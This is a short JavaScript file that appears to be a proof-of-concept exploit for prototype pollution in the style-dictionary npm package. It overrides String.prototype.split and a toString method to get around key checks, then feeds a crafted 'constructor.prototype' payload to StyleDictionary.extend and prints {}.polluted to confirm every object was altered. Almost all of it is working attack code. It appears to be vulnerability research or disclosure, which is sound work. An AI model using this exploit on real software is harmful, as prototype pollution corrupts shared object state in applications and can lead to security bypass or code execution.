var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const StyleDictionary = require('style-dictionary');
const obj = {};
let opts = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
console.log({}.polluted);
StyleDictionary.extend(opts);
console.log({}.polluted);